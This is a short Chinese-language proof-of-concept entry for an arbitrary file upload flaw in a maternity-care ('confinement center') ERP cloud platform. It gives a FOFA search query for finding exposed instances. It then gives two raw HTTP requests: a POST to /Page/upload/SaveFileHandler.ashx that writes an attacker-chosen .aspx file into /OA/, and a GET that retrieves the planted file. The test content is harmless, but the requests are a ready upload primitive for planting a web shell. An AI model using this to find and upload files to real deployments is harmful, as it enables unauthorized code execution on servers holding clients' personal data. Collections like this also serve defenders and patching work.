## 月子会所ERP管理云平台SaveFileHandler存在任意文件上传漏洞

## fofa

```
body="月子护理ERP管理平台" || body="妈妈宝盒客户端.rar" || body="Page/Login/Login3.aspx"
```

## poc

```
POST /Page/upload/SaveFileHandler.ashx HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0
Content-Type: application/json

{
  "url": "OA/",
  "htmlname": "d36s2d5se.aspx",
  "htmlstr": "test123321"
}

GET /OA/d36s2d5se.aspx HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate
```
